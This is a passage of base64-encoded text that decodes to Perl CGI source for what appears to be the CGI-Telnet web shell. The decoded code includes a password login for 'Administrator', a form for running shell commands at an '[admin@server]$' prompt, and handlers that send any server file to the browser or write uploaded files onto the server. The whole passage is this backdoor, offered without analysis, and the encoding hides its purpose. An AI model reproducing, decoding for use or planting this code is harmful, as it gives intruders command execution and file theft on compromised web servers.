tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIEFkZCBodG1sIHNwZWNpYWwgY2hhcnMKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgSHRtbFNwZWNpYWxDaGFycygkKXsKCW15ICR0ZXh0ID0gc2hpZnQ7CgkkdGV4dCA9fiBzLyYvJmFtcDsvZzsKCSR0ZXh0ID1+IHMvIi8mcXVvdDsvZzsKCSR0ZXh0ID1+IHMvJy8mIzAzOTsvZzsKCSR0ZXh0ID1+IHMvPC8mbHQ7L2c7CgkkdGV4dCA9fiBzLz4vJmd0Oy9nOwoJcmV0dXJuICR0ZXh0Owp9CiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBBZGQgbGluayBmb3IgZGlyZWN0b3J5CiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIEFkZExpbmtEaXIoJCkKewoJbXkgJGFjPXNoaWZ0OwoJbXkgQGRpcj0oKTsKCWlmKCRXaW5OVCkKCXsKCQlAZGlyPXNwbGl0KC9cXC8sJEN1cnJlbnREaXIpOwoJfWVsc2UKCXsKCQlAZGlyPXNwbGl0KCIvIiwmdHJpbSgkQ3VycmVudERpcikpOwoJfQoJbXkgJHBhdGg9IiI7CglteSAkcmVzdWx0PSIiOwoJZm9yZWFjaCAoQGRpcikKCXsKCQkkcGF0aCAuPSAkXy4kUGF0aFNlcDsKCQkkcmVzdWx0Lj0iPGEgaHJlZj0nP2E9Ii4kYWMuIiZkPSIuJHBhdGguIic+Ii4kXy4kUGF0aFNlcC4iPC9hPiI7Cgl9CglyZXR1cm4gJHJlc3VsdDsKfQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUHJpbnRzIHRoZSBtZXNzYWdlIHRoYXQgaW5mb3JtcyB0aGUgdXNlciBvZiBhIGZhaWxlZCBsb2dpbgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludExvZ2luRmFpbGVkTWVzc2FnZQp7CglwcmludCA8PEVORDsKPGJyPkxvZ2luIDogQWRtaW5pc3RyYXRvcjxicj4KClBhc3N3b3JkOjxicj4KTG9naW4gaW5jb3JyZWN0PGJyPjxicj4KRU5ECn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBQcmludHMgdGhlIEhUTUwgZm9ybSBmb3IgbG9nZ2luZyBpbgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludExvZ2luRm9ybQp7CglwcmludCA8PEVORDsKPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJsb2dpbiI+CkxvZ2luIDogQWRtaW5pc3RyYXRvcjxicj4KUGFzc3dvcmQ6PGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwIj4KPGlucHV0IGNsYXNzPSJzdWJtaXQiIHR5cGU9InN1Ym1pdCIgdmFsdWU9IkVudGVyIj4KPC9mb3JtPgpFTkQKfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFByaW50cyB0aGUgZm9vdGVyIGZvciB0aGUgSFRNTCBQYWdlCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50UGFnZUZvb3Rlcgp7CglwcmludCAiPGJyPjxmb250IGNvbG9yPXJlZD5vLS0tWyAgPGZvbnQgY29sb3I9I2ZmOTkwMD5FZGl0IGJ5ICRFZGl0UGVyc2lvbiA8L2ZvbnQ+ICBdLS0tbzwvZm9udD48L2NvZGU+PC9jZW50ZXI+PC9ib2R5PjwvaHRtbD4iOwp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUmV0cmVpdmVzIHRoZSB2YWx1ZXMgb2YgYWxsIGNvb2tpZXMuIFRoZSBjb29raWVzIGNhbiBiZSBhY2Nlc3NlcyB1c2luZyB0aGUKIyB2YXJpYWJsZSAkQ29va2llc3snJ30KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgR2V0Q29va2llcwp7CglAaHR0cGNvb2tpZXMgPSBzcGxpdCgvOyAvLCRFTlZ7J0hUVFBfQ09PS0lFJ30pOwoJZm9yZWFjaCAkY29va2llKEBodHRwY29va2llcykKCXsKCQkoJGlkLCAkdmFsKSA9IHNwbGl0KC89LywgJGNvb2tpZSk7CgkJJENvb2tpZXN7JGlkfSA9ICR2YWw7Cgl9Cn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBQcmludHMgdGhlIHNjcmVlbiB3aGVuIHRoZSB1c2VyIGxvZ3Mgb3V0CiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50TG9nb3V0U2NyZWVuCnsKCXByaW50ICJDb25uZWN0aW9uIGNsb3NlZCBieSBmb3JlaWduIGhvc3QuPGJyPjxicj4iOwp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgTG9ncyBvdXQgdGhlIHVzZXIgYW5kIGFsbG93cyB0aGUgdXNlciB0byBsb2dpbiBhZ2FpbgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQZXJmb3JtTG9nb3V0CnsKCXByaW50ICJTZXQtQ29va2llOiBTQVZFRFBXRD07XG4iOyAjIHJlbW92ZSBwYXNzd29yZCBjb29raWUKCSZQcmludFBhZ2VIZWFkZXIoInAiKTsKCSZQcmludExvZ291dFNjcmVlbjsKCgkmUHJpbnRMb2dpblNjcmVlbjsKCSZQcmludExvZ2luRm9ybTsKCSZQcmludFBhZ2VGb290ZXI7CglleGl0Owp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgdG8gbG9naW4gdGhlIHVzZXIuIElmIHRoZSBwYXNzd29yZCBtYXRjaGVzLCBpdAojIGRpc3BsYXlzIGEgcGFnZSB0aGF0IGFsbG93cyB0aGUgdXNlciB0byBydW4gY29tbWFuZHMuIElmIHRoZSBwYXNzd29yZCBkb2Vucyd0CiMgbWF0Y2ggb3IgaWYgbm8gcGFzc3dvcmQgaXMgZW50ZXJlZCwgaXQgZGlzcGxheXMgYSBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyCiMgdG8gbG9naW4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgUGVyZm9ybUxvZ2luIAp7CglpZigkTG9naW5QYXNzd29yZCBlcSAkUGFzc3dvcmQpICMgcGFzc3dvcmQgbWF0Y2hlZAoJewoJCXByaW50ICJTZXQtQ29va2llOiBTQVZFRFBXRD0kTG9naW5QYXNzd29yZDtcbiI7CgkJJlByaW50UGFnZUhlYWRlcjsKCQlwcmludCAmTGlzdERpcjsKCX0KCWVsc2UgIyBwYXNzd29yZCBkaWRuJ3QgbWF0Y2gKCXsKCQkmUHJpbnRQYWdlSGVhZGVyKCJwIik7CgkJJlByaW50TG9naW5TY3JlZW47CgkJaWYoJExvZ2luUGFzc3dvcmQgbmUgIiIpICMgc29tZSBwYXNzd29yZCB3YXMgZW50ZXJlZAoJCXsKCQkJJlByaW50TG9naW5GYWlsZWRNZXNzYWdlOwoKCQl9CgkJJlByaW50TG9naW5Gb3JtOwoJCSZQcmludFBhZ2VGb290ZXI7CgkJZXhpdDsKCX0KfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFByaW50cyB0aGUgSFRNTCBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIGVudGVyIGNvbW1hbmRzCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50Q29tbWFuZExpbmVJbnB1dEZvcm0KewoJbXkgJGRpcj0gIjxzcGFuIHN0eWxlPSdmb250OiAxMXB0IFZlcmRhbmE7IGZvbnQtd2VpZ2h0OiBib2xkOyc+Ii4mQWRkTGlua0RpcigiY29tbWFuZCIpLiI8L3NwYW4+IjsKCSRQcm9tcHQgPSAkV2luTlQgPyAiJGRpciA+ICIgOiAiPGZvbnQgY29sb3I9JyM2NmZmNjYnPlthZG1pblxAJFNlcnZlck5hbWUgJGRpcl1cJDwvZm9udD4gIjsKCXJldHVybiA8PEVORDsKPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+Cgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iY29tbWFuZCI+Cgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPgokUHJvbXB0CjxpbnB1dCB0eXBlPSJ0ZXh0IiBzaXplPSI1MCIgbmFtZT0iYyI+CjxpbnB1dCBjbGFzcz0ic3VibWl0InR5cGU9InN1Ym1pdCIgdmFsdWU9IkVudGVyIj4KPC9mb3JtPgpFTkQKfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFByaW50cyB0aGUgSFRNTCBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIGRvd25sb2FkIGZpbGVzCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50RmlsZURvd25sb2FkRm9ybQp7CglteSAkZGlyID0gJkFkZExpbmtEaXIoImRvd25sb2FkIik7IAoJJFByb21wdCA9ICRXaW5OVCA/ICIkZGlyID4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRkaXJdXCQgIjsKCXJldHVybiA8PEVORDsKPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkQ3VycmVudERpciI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJkb3dubG9hZCI+CiRQcm9tcHQgZG93bmxvYWQ8YnI+PGJyPgpGaWxlbmFtZTogPGlucHV0IGNsYXNzPSJmaWxlIiB0eXBlPSJ0ZXh0IiBuYW1lPSJmIiBzaXplPSIzNSI+PGJyPjxicj4KRG93bmxvYWQ6IDxpbnB1dCBjbGFzcz0ic3VibWl0IiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJCZWdpbiI+Cgo8L2Zvcm0+CkVORAp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUHJpbnRzIHRoZSBIVE1MIGZvcm0gdGhhdCBhbGxvd3MgdGhlIHVzZXIgdG8gdXBsb2FkIGZpbGVzCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50RmlsZVVwbG9hZEZvcm0KewoJbXkgJGRpcj0gJkFkZExpbmtEaXIoInVwbG9hZCIpOwoJJFByb21wdCA9ICRXaW5OVCA/ICIkZGlyID4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRkaXJdXCQgIjsKCXJldHVybiA8PEVORDsKPGZvcm0gbmFtZT0iZiIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+CiRQcm9tcHQgdXBsb2FkPGJyPjxicj4KRmlsZW5hbWU6IDxpbnB1dCBjbGFzcz0iZmlsZSIgdHlwZT0iZmlsZSIgbmFtZT0iZiIgc2l6ZT0iMzUiPjxicj48YnI+Ck9wdGlvbnM6ICZuYnNwOzxpbnB1dCB0eXBlPSJjaGVja2JveCIgbmFtZT0ibyIgaWQ9InVwIiB2YWx1ZT0ib3ZlcndyaXRlIj4KPGxhYmVsIGZvcj0idXAiPk92ZXJ3cml0ZSBpZiBpdCBFeGlzdHM8L2xhYmVsPjxicj48YnI+ClVwbG9hZDombmJzcDsmbmJzcDsmbmJzcDs8aW5wdXQgY2xhc3M9InN1Ym1pdCIgdHlwZT0ic3VibWl0IiB2YWx1ZT0iQmVnaW4iPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPgo8aW5wdXQgY2xhc3M9InN1Ym1pdCIgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0idXBsb2FkIj4KCjwvZm9ybT4KCkVORAp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdGltZW91dCBmb3IgYSBjb21tYW5kIGV4cGlyZXMuIFdlIG5lZWQgdG8KIyB0ZXJtaW5hdGUgdGhlIHNjcmlwdCBpbW1lZGlhdGVseS4gVGhpcyBmdW5jdGlvbiBpcyB2YWxpZCBvbmx5IG9uIFVuaXguIEl0IGlzCiMgbmV2ZXIgY2FsbGVkIHdoZW4gdGhlIHNjcmlwdCBpcyBydW5uaW5nIG9uIE5ULgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBDb21tYW5kVGltZW91dAp7CglpZighJFdpbk5UKQoJewoJCWFsYXJtKDApOwoJCXJldHVybiA8PEVORDsKPC90ZXh0YXJlYT4KPGJyPjxmb250IGNvbG9yPXllbGxvdz4KQ29tbWFuZCBleGNlZWRlZCBtYXhpbXVtIHRpbWUgb2YgJENvbW1hbmRUaW1lb3V0RHVyYXRpb24gc2Vjb25kKHMpLjwvZm9udD4KPGJyPjxmb250IHNpemU9JzYnIGNvbG9yPXJlZD5LaWxsZWQgaXQhPC9mb250PgpFTkQKCX0KfQoKCgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiBkaXNwbGF5cyB0aGUgcGFnZSB0aGF0IGNvbnRhaW5zIGEgbGluayB3aGljaCBhbGxvd3MgdGhlIHVzZXIKIyB0byBkb3dubG9hZCB0aGUgc3BlY2lmaWVkIGZpbGUuIFRoZSBwYWdlIGFsc28gY29udGFpbnMgYSBhdXRvLXJlZnJlc2gKIyBmZWF0dXJlIHRoYXQgc3RhcnRzIHRoZSBkb3dubG9hZCBhdXRvbWF0aWNhbGx5LgojIEFyZ3VtZW50IDE6IEZ1bGx5IHF1YWxpZmllZCBmaWxlbmFtZSBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50RG93bmxvYWRMaW5rUGFnZQp7Cglsb2NhbCgkRmlsZVVybCkgPSBAXzsKCW15ICRyZXN1bHQ9IiI7CglpZigtZSAkRmlsZVVybCkgIyBpZiB0aGUgZmlsZSBleGlzdHMKCXsKCQkjIGVuY29kZSB0aGUgZmlsZSBsaW5rIHNvIHdlIGNhbiBzZW5kIGl0IHRvIHRoZSBicm93c2VyCgkJJEZpbGVVcmwgPX4gcy8oW15hLXpBLVowLTldKS8nJScudW5wYWNrKCJIKiIsJDEpL2VnOwoJCSREb3dubG9hZExpbmsgPSAiJFNjcmlwdExvY2F0aW9uP2E9ZG93bmxvYWQmZj0kRmlsZVVybCZvPWdvIjsKCQkkSHRtbE1ldGFIZWFkZXIgPSAiPG1ldGEgSFRUUC1FUVVJVj1cIlJlZnJlc2hcIiBDT05URU5UPVwiMTsgVVJMPSREb3dubG9hZExpbmtcIj4iOwoJCSZQcmludFBhZ2VIZWFkZXIoImMiKTsKCQkkcmVzdWx0IC49IDw8RU5EOwpTZW5kaW5nIEZpbGUgJFRyYW5zZmVyRmlsZS4uLjxicj4KCklmIHRoZSBkb3dubG9hZCBkb2VzIG5vdCBzdGFydCBhdXRvbWF0aWNhbGx5LAo8YSBocmVmPSIkRG93bmxvYWRMaW5rIj5DbGljayBIZXJlPC9hPgpFTkQKCQkkcmVzdWx0IC49ICZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOwoJfQoJZWxzZSAjIGZpbGUgZG9lc24ndCBleGlzdAoJewoJCSRyZXN1bHQgLj0gIkZhaWxlZCB0byBkb3dubG9hZCAkRmlsZVVybDogJCEiOwoJCSRyZXN1bHQgLj0gJlByaW50RmlsZURvd25sb2FkRm9ybTsKCX0KCXJldHVybiAkcmVzdWx0Owp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiByZWFkcyB0aGUgc3BlY2lmaWVkIGZpbGUgZnJvbSB0aGUgZGlzayBhbmQgc2VuZHMgaXQgdG8gdGhlCiMgYnJvd3Nlciwgc28gdGhhdCBpdCBjYW4gYmUgZG93bmxvYWRlZCBieSB0aGUgdXNlci4KIyBBcmd1bWVudCAxOiBGdWxseSBxdWFsaWZpZWQgcGF0aG5hbWUgb2YgdGhlIGZpbGUgdG8gYmUgc2VudC4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgU2VuZEZpbGVUb0Jyb3dzZXIKewoJbXkgJHJlc3VsdCA9ICIiOwoJbG9jYWwoJFNlbmRGaWxlKSA9IEBfOwoJaWYob3BlbihTRU5ERklMRSwgJFNlbmRGaWxlKSkgIyBmaWxlIG9wZW5lZCBmb3IgcmVhZGluZwoJewoJCWlmKCRXaW5OVCkKCQl7CgkJCWJpbm1vZGUoU0VOREZJTEUpOwoJCQliaW5tb2RlKFNURE9VVCk7CgkJfQoJCSRGaWxlU2l6ZSA9IChzdGF0KCRTZW5kRmlsZSkpWzddOwoJCSgkRmlsZW5hbWUgPSAkU2VuZEZpbGUpID1+ICBtIShbXi9eXFxdKikkITsKCQlwcmludCAiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXVua25vd25cbiI7CgkJcHJpbnQgIkNvbnRlbnQtTGVuZ3RoOiAkRmlsZVNpemVcbiI7CgkJcHJpbnQgIkNvbnRlbnQtRGlzcG9zaXRpb246IGF0dGFjaG1lbnQ7IGZpbGVuYW1lPSQxXG5cbiI7CgkJcHJpbnQgd2hpbGUoPFNFTkRGSUxFPik7CgkJY2xvc2UoU0VOREZJTEUpOwoJCWV4aXQoMSk7Cgl9CgllbHNlICMgZmFpbGVkIHRvIG9wZW4gZmlsZQoJewoJCSRyZXN1bHQgLj0gIkZhaWxlZCB0byBkb3dubG9hZCAkU2VuZEZpbGU6ICQhIjsKCQkkcmVzdWx0IC49JlByaW50RmlsZURvd25sb2FkRm9ybTsKCX0KCXJldHVybiAkcmVzdWx0Owp9CgoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHdoZW4gdGhlIHVzZXIgZG93bmxvYWRzIGEgZmlsZS4gSXQgZGlzcGxheXMgYSBtZXNzYWdlCiMgdG8gdGhlIHVzZXIgYW5kIHByb3ZpZGVzIGEgbGluayB0aHJvdWdoIHdoaWNoIHRoZSBmaWxlIGNhbiBiZSBkb3dubG9hZGVkLgojIFRoaXMgZnVuY3Rpb24gaXMgYWxzbyBjYWxsZWQgd2hlbiB0aGUgdXNlciBjbGlja3Mgb24gdGhhdCBsaW5rLiBJbiB0aGlzIGNhc2UsCiMgdGhlIGZpbGUgaXMgcmVhZCBhbmQgc2VudCB0byB0aGUgYnJvd3Nlci4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgQmVnaW5Eb3dubG9hZAp7CgkjIGdldCBmdWxseSBxdWFsaWZpZWQgcGF0aCBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkCglpZigoJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXFx8Xi46LykpIHwKCQkoISRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlwvLykpKSAjIHBhdGggaXMgYWJzb2x1dGUKCXsKCQkkVGFyZ2V0RmlsZSA9ICRUcmFuc2ZlckZpbGU7Cgl9CgllbHNlICMgcGF0aCBpcyByZWxhdGl2ZQoJewoJCWNob3AoJFRhcmdldEZpbGUpIGlmKCRUYXJnZXRGaWxlID0gJEN1cnJlbnREaXIpID1+IG0vW1xcXC9dJC87CgkJJFRhcmdldEZpbGUgLj0gJFBhdGhTZXAuJFRyYW5zZmVyRmlsZTsKCX0KCglpZigkT3B0aW9ucyBlcSAiZ28iKSAjIHdlIGhhdmUgdG8gc2VuZCB0aGUgZmlsZQoJewoJCSZTZW5kRmlsZVRvQnJvd3NlcigkVGFyZ2V0RmlsZSk7Cgl9CgllbHNlICMgd2UgaGF2ZSB0byBzZW5kIG9ubHkgdGhlIGxpbmsgcGFnZQoJewoJCSZQcmludERvd25sb2FkTGlua1BhZ2UoJFRhcmdldEZpbGUpOwoJfQp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdXNlciB3YW50cyB0byB1cGxvYWQgYSBmaWxlLiBJZiB0aGUKIyBmaWxlIGlzIG5vdCBzcGVjaWZpZWQsIGl0IGRpc3BsYXlzIGEgZm9ybSBhbGxvd2luZyB0aGUgdXNlciB0byBzcGVjaWZ5IGEKIyBmaWxlLCBvdGhlcndpc2UgaXQgc3RhcnRzIHRoZSB1cGxvYWQgcHJvY2Vzcy4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgVXBsb2FkRmlsZQp7CgkjIGlmIG5vIGZpbGUgaXMgc3BlY2lmaWVkLCBwcmludCB0aGUgdXBsb2FkIGZvcm0gYWdhaW4KCWlmKCRUcmFuc2ZlckZpbGUgZXEgIiIpCgl7CgkJcmV0dXJuICZQcmludEZpbGVVcGxvYWRGb3JtOwoKCX0KCW15ICRyZXN1bHQ9IiI7CgkjIHN0YXJ0IHRoZSB1cGxvYWRpbmcgcHJvY2VzcwoJJHJlc3VsdCAuPSAiVXBsb2FkaW5nICRUcmFuc2ZlckZpbGUgdG8gJEN1cnJlbnREaXIuLi48YnI+IjsKCgkjIGdldCB0aGUgZnVsbGx5IHF1YWxpZmllZCBwYXRobmFtZSBvZiB0aGUgZmlsZSB0byBiZSBjcmVhdGVkCgljaG9wKCRUYXJnZXROYW1lKSBpZiAoJFRhcmdldE5hbWUgPSAkQ3VycmVudERpcikgPX4gbS9bXFxcL10kLzsKCSRUcmFuc2ZlckZpbGUgPX4gbSEoW14vXlxcXSopJCE7CgkkVGFyZ2V0TmFtZSAuPSAkUGF0aFNlcC4kMTsKCgkkVGFyZ2V0RmlsZVNpemUgPSBsZW5ndGgoJGlueydmaWxlZGF0YSd9KTsKCSMgaWYgdGhlIGZpbGUgZXhpc3RzIGFuZCB3ZSBhcmUgbm90IHN1cHBvc2VkIHRvIG92ZXJ3cml0ZSBpdAoJaWYoLWUgJFRhcmdldE5hbWUgJiYgJE9wdGlvbnMgbmUgIm92ZXJ3cml0ZSIpCgl7CgkJJHJlc3VsdCAuPSAiRmFpbGVkOiBEZXN0aW5hdGlvbiBmaWxlIGFscmVhZHkgZXhpc3RzLjxicj4iOwoJfQoJZWxzZSAjIGZpbGUgaXMgbm90IHByZXNlbnQKCXsKCQlpZihvcGVuKFVQTE9BREZJTEUsICI+JFRhcmdldE5hbWUiKSkKCQl7CgkJCWJpbm1vZGUoVVBMT0FERklMRSkgaWYgJFdpbk5UOwoJCQlwcmludCBVUExPQURGSUxFICRpbnsnZmlsZWRhdGEnfTsKCQkJY2xvc2UoVVBMT0FERklMRSk7CgkJCSRyZXN1bHQgLj0gIlRyYW5zZmVyZWQgJFRhcmdldEZpbGVTaXplIEJ5dGVzLjxicj4iOwoJCQkkcmVzdWx0IC49ICJGaWxlIFBhdGg6ICRUYXJnZXROYW1lPGJyPiI7CgkJfQoJCWVsc2UKCQl7CgkJCSRyZXN1bHQgLj0gIkZhaWxlZDogJCE8YnI+IjsKCQl9Cgl9CgkkcmVzdWx0IC49ICZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOwoJcmV0dXJuICRyZXN1bHQ7Cn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB3aGVuIHRoZSB1c2VyIHdhbnRzIHRvIGRvd25sb2FkIGEgZmlsZS4gSWYgdGhlCiMgZmlsZW5hbWUgaXMgbm90IHNwZWNpZmllZCwgaXQgZGlzcGxheXMgYSBmb3JtIGFsbG93aW5nIHRoZSB1c2VyIHRvIHNwZWNpZnkgYQojIGZpbGUsIG90aGVyd2lzZSBpdCBkaXNwbGF5cyBhIG1lc3NhZ2UgdG8gdGhlIHVzZXIgYW5kIHBy